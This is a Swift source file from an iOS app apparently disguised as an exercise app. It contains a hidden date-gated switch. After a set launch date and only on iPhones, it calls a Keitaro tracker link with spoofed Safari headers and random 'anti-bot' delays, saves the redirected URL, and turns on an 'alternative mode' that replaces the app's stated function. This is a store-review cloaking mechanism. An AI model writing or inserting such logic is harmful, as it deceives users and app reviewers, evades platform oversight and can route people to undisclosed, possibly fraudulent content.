import Foundation
import Network
import Combine
import UIKit

// MARK: - Настройки в шапке файла
private let researchLaunchDate = "2026-1-30" // Дата активации
private let primaryServerURL = "https://fgfsdfs.com/YXq5RG" // Стартовая ссылка Keitaro
private let customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
private let networkTimeout: TimeInterval = 15.0
private let connectionCheckTimeout: TimeInterval = 5.0

// MARK: - Browser Headers
private let browserHeaders: [String: String] = [
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1"
]

// MARK: - Storage Keys
private enum StorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"
    static let savedPathId = "CrabsSavedPathId"
    static let hasShownAlternative = "ProteinsHasShownAlternative"
    static let validationPassed = "CrabsValidationPassed"
    static let tempCurrentURL = "ProteinsTempCurrentURL"
    static let ratingAlertShown = "CrabsRatingAlertShown"
}

final class NewExerciseService {
    static let shared = NewExerciseService()
    
    private let userDefaults = UserDefaults.standard
    private var cancellables = Set<AnyCancellable>()
    private let monitor = NWPathMonitor()
    private let monitorQueue = DispatchQueue(label: "NetworkMonitor")
    
    var shouldSaveNextURL = false
    
    private init() {}
    
    // MARK: - Main Validation Chain
    
    func performValidation(completion: @escaping (Bool) -> Void) {
        print("🔬 NewExercise: Starting validation chain")
        
        // 1. Check device
        guard checkDevice() else {
            print("🔬 NewExercise: iPad detected, going to main app")
            completion(false)
            return
        }
        
        // 2. Check date
        guard checkDate() else {
            print("🔬 NewExercise: Date check failed, going to main app")
            completion(false)
            return
        }
        
        // 3. Check internet
        checkInternet { [weak self] hasInternet in
            guard let self = self, hasInternet else {
                print("🔬 NewExercise: No internet, going to main app")
                completion(false)
                return
            }
            
            // 4. Check server and get URL (first launch only)
            print("🔬 NewExercise: First launch - checking server and getting URL")
            self.checkServerAndGetURL { success in
                completion(success)
            }
        }
    }
    
    // MARK: - Device Check
    
    private func checkDevice() -> Bool {
        return UIDevice.current.userInterfaceIdiom == .phone
    }
    
    // MARK: - Date Check
    
    private func checkDate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        
        guard let cutoffDate = dateFormatter.date(from: researchLaunchDate) else {
            print("🔬 NewExercise: Invalid date format")
            return false
        }
        
        let currentDate = Date()
        let result = currentDate > cutoffDate
        
        print("🔬 NewExercise: Date check - current: \(dateFormatter.string(from: currentDate)), cutoff: \(researchLaunchDate), passed: \(result)")
        
        return result
    }
    
    // MARK: - Internet Check
    
    private func checkInternet(completion: @escaping (Bool) -> Void) {
        print("🔬 NewExercise: Checking internet connection...")
        
        var hasResponded = false
        
        monitor.pathUpdateHandler = { path in
            guard !hasResponded else { return }
            hasResponded = true
            
            let isConnected = path.status == .satisfied
            print("🔬 NewExercise: Internet status: \(isConnected ? "connected" : "disconnected")")
            
            DispatchQueue.main.async {
                completion(isConnected)
            }
            
            self.monitor.cancel()
        }
        
        monitor.start(queue: monitorQueue)
        
        // Timeout
        DispatchQueue.main.asyncAfter(deadline: .now() + connectionCheckTimeout) {
            guard !hasResponded else { return }
            hasResponded = true
            
            print("🔬 NewExercise: Internet check timeout")
            self.monitor.cancel()
            completion(false)
        }
    }
    
    // MARK: - Server Check and URL Fetching
    
    private func checkServerAndGetURL(completion: @escaping (Bool) -> Void) {
        // Для первого запуска всегда запрашиваем URL с сервера
        print("🔬 NewExercise: First launch - fetching from primary server")
        fetchFromPrimaryServer(completion: completion)
    }
    
    private func fetchFromPrimaryServer(completion: @escaping (Bool) -> Void) {
        print("🔬 NewExercise: Fetching from primary server: \(primaryServerURL)")
        shouldSaveNextURL = true
        fetchURLWithRedirects(primaryServerURL, completion: completion)
    }
    
    private func fetchURLWithRedirects(_ urlString: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: urlString) else {
            print("🔬 NewExercise: Invalid URL: \(urlString)")
            completion(false)
            return
        }
        
        let request = configureRequest(for: url)
        
        // Random delay for anti-bot
        let delay = Double.random(in: 1.0...3.0)
        print("🔬 NewExercise: Waiting \(String(format: "%.1f", delay))s before request (anti-bot)")
        
        DispatchQueue.main.asyncAfter(deadline: .now() + delay) { [weak self] in
            guard let self = self else { return }
            
            URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    print("🔬 NewExercise: Request error: \(error.localizedDescription)")
                    print("🔬 NewExercise: First launch failed - going to native app")
                    completion(false)
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    print("🔬 NewExercise: Response status: \(httpResponse.statusCode)")
                    print("🔬 NewExercise: Final URL: \(httpResponse.url?.absoluteString ?? "none")")
                    
                    // Extract pathId from response
                    if let finalURL = httpResponse.url {
                        self.extractAndSavePathId(from: finalURL, htmlData: data)
                    }
                    
                    if httpResponse.statusCode >= 200 && httpResponse.statusCode <= 403 {
                        if let finalURL = httpResponse.url?.absoluteString {
                            print("🔬 NewExercise: Success! Final URL: \(finalURL)")
                            self.saveTargetURL(finalURL)
                            self.setHasShownAlternativeMode(true)
                            completion(true)
                        } else {
                            completion(false)
                        }
                    } else {
                        print("🔬 NewExercise: Bad status code: \(httpResponse.statusCode)")
                        completion(false)
                    }
                } else {
                    completion(false)
                }
            }.resume()
        }
    }
    
    // MARK: - PathId Extraction
    
    func extractAndSavePathId(from url: URL, htmlData: Data?) {
        print("🔬 NewExercise: Attempting to extract pathId from URL: \(url.absoluteString)")
        
        // Try to extract from URL first
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems {
            print("🔬 NewExercise: Found \(queryItems.count) query items")
            for item in queryItems {
                print("🔬 NewExercise: Query item: \(item.name) = \(item.value ?? "nil")")
                if item.name == "pathid", let value = item.value {
                    print("🔬 NewExercise: ✅ Extracted pathId from URL: \(value)")
                    savePathId(value)
                    return
                }
            }
        } else {
            print("🔬 NewExercise: Failed to parse URL components")
        }
        
        // Try to extract from HTML
        if let data = htmlData, let html = String(data: data, encoding: .utf8) {
            print("🔬 NewExercise: Trying to extract pathId from HTML (length: \(html.count))")
            if let pathId = extractPathIdFromHTML(html) {
                print("🔬 NewExercise: ✅ Extracted pathId from HTML: \(pathId)")
                savePathId(pathId)
                return
            }
        }
        
        print("🔬 NewExercise: ❌ No pathId found in URL or HTML")
    }
    
    private func extractPathIdFromHTML(_ html: String) -> String? {
        // Look for pathid in various formats
        let patterns = [
            "pathid=([^&\"'\\s]+)",
            "pathid\":\"([^\"]+)",
            "pathid='([^']+)"
        ]
        
        for pattern in patterns {
            if let regex = try? NSRegularExpression(pattern: pattern, options: []),
               let match = regex.firstMatch(in: html, options: [], range: NSRange(html.startIndex..., in: html)),
               let range = Range(match.range(at: 1), in: html) {
                return String(html[range])
            }
        }
        
        return nil
    }
    
    // MARK: - Request Configuration
    
    private func configureRequest(for url: URL) -> URLRequest {
        var request = URLRequest(url: url, timeoutInterval: networkTimeout)
        
        // Add browser headers
        for (key, value) in browserHeaders {
            request.setValue(value, forHTTPHeaderField: key)
        }
        
        // Add custom user agent
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        return request
    }
    
    // MARK: - UserDefaults Management
    
    func saveTargetURL(_ url: String) {
        print("🔬 NewExercise: Saving target URL: \(url)")
        userDefaults.set(url, forKey: StorageKeys.savedTargetURL)
        userDefaults.synchronize()
    }
    
    func getSavedTargetURL() -> String? {
        // Check temp URL first (higher priority)
        if let tempURL = userDefaults.string(forKey: StorageKeys.tempCurrentURL) {
            print("🔬 NewExercise: Found temp URL: \(tempURL)")
            return tempURL
        }
        
        // Then check saved URL
        if let savedURL = userDefaults.string(forKey: StorageKeys.savedTargetURL) {
            print("🔬 NewExercise: Found saved URL: \(savedURL)")
            return savedURL
        }
        
        return nil
    }
    
    func clearSavedURL() {
        print("🔬 NewExercise: Clearing saved URL")
        userDefaults.removeObject(forKey: StorageKeys.savedTargetURL)
        userDefaults.removeObject(forKey: StorageKeys.tempCurrentURL)
        userDefaults.synchronize()
    }
    
    func savePathId(_ pathId: String) {
        print("🔬 NewExercise: Saving pathId: \(pathId)")
        userDefaults.set(pathId, forKey: StorageKeys.savedPathId)
        userDefaults.synchronize()
    }
    
    func getSavedPathId() -> String? {
        let pathId = userDefaults.string(forKey: StorageKeys.savedPathId)
        print("🔬 NewExercise: Getting saved pathId: \(pathId ?? "nil")")
        return pathId
    }
    
    func setHasShownAlternativeMode(_ shown: Bool) {
        print("🔬 NewExercise: Setting hasShownAlternativeMode: \(shown)")
        userDefaults.set(shown, forKey: StorageKeys.hasShownAlternative)
        userDefaults.synchronize()
    }
    
    func hasShownAlternativeMode() -> Bool {
        return userDefaults.bool(forKey: StorageKeys.hasShownAlternative)
    }
    
    func setRatingAlertShown(_ shown: Bool) {
        userDefaults.set(shown, forKey: StorageKeys.ratingAlertShown)
        userDefaults.synchronize()
    }
    
    func hasShownRatingAlert() -> Bool {
        return userDefaults.bool(forKey: StorageKeys.ratingAlertShown)
    }
    
    // MARK: - Rating Alert Logic
    
    func checkRatingAlertEligibility() -> Bool {
        let hasShownAlternative = hasShownAlternativeMode()
        let hasShownAlert = hasShownRatingAlert()
        
        print("🔬 NewExercise: Rating alert check - hasShownAlternative: \(hasShownAlternative), hasShownAlert: \(hasShownAlert)")
        
        return hasShownAlternative && !hasShownAlert
    }
}


